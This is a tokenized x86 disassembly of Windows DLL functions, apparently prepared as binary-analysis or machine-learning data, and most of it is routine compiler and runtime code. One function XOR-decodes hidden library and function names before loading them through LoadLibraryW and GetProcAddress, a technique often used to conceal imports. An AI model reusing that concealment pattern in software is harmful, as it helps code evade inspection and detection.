mov ecx ebx
call sub_1001f460
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
call sub_1007f5d0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_1006b3f0
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_1007f5d0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_1006b42c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100648f2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_1006b450
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1001f7a0
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1006b47a
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1001da0a
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000206b
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10027023
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_1006b530
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xbc ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xb8 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xb8 ]
push ebx
mov ebx [ ebp - 0xbc ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10046920
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] 0x0
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7c
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x26 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xbc ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0xac
inc dl
mov [ ebp + ecx - 0x14 ] bl
movzx ecx dl
cmp ecx 0xd
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x7 ] 0x0
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x36
call sub_10070810
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x78 ]
mov eax 0x53
call sub_10070810
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x50 ]
mov eax 0x5a
call sub_10070810
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xb4 ]
mov eax 0x5c
call sub_10070810
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x24 ]
mov eax 0x1f
call sub_10070810
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x8c ]
mov eax 0x48
call sub_10070810
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x64 ]
mov eax 0x1e
call sub_10070810
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
mov [ esi + 0xb8 ] 0x1
sub_1006b750
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1006b7a8
push 0x3c
mov eax sub_10085776
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100424ab
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10002a9d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_1006b85f
call sub_1005943c
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1001435e
pop ecx
push 0x3
call sub_10059e7b
int3
push 0x1
push 0x40000015
push 0x3
call sub_1004091d
add esp 0xc
sub_1006b8a0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x87
sub eax 0x2
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov [ esi ] eax
mov eax [ ecx + 0x24 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x86
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
call sub_10053240
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1006b91f
push 0x194
mov eax sub_10085d6f
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10030f91
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_1004166b
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_10034a80
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10071c21
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_10045f0b
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1003c519
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1003c519
mov eax [ ebp - 0x188 ]
call sub_1004642f
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1005f7e4
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_10034a80
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1006e90e
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1004a330
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1003dcac
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_10055b84
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_1004a330
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_1000ff3d
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_1001c121
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001c121
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_10055b84
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10071c21
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_1003c519
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1003c519
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1005a5dc
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_10055017
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1005a5dc
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_10055b84
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10027f5a
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_10055017
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1003c519
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_1002c8c0
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001c121
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_1003c519
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10067e0a
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
add edi 0x2
call sub_1005a5dc
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_1003c519
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10067e0a
mov ecx esi
call sub_1005a5dc
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_10055b84
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_1003c519
test edi edi
je r-xdata
mov ecx esi
call sub_1005a5dc
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10055017
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10027f5a
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1003c519
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_1002c8c0
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_10055017
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_1003c519
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001c121
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001c121
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10067e0a
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001c121
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x16c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10067e0a
inc [ ebp - 0x17c ]
mov ecx esi
call sub_1001c121
sub_1006c2d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x4 ]
cmp ebx [ ebp + 0xc ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edx [ ebx - 0x4 ]
lea esi [ ebx - 0x4 ]
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov eax ebx
sub eax esi
sar eax 0x2
add eax eax
add eax eax
push eax
mov ecx ebx
sub ecx eax
add ecx 0x4
push esi
push ecx
call sub_1007ec90
add esp 0xc
mov [ esi ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] esi
mov [ ecx ] eax
mov edx [ esi - 0x4 ]
sub esi 0x4
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
jne r-xdata
add ebx 0x4
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ esi ]
mov edi [ ebx ]
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
pop edi
sub_1006c360
push ebp
mov ebp esp
push 0xffffffff
push sub_10088a37
mov eax [ fs : 0x0 ]
push eax
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x8 ] 0x0
mov [ ebp - 0x240 ] ebx
jne r-xdata
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebx + 0xa4 ]
lea esi [ ebx + 0x94 ]
push r--data
xor edi edi
mov ecx esi
call sub_1001a2f0
test eax eax
je r-xdata
cmp [ ebx + 0x84 ] 0x8
lea eax [ ebx + 0x70 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
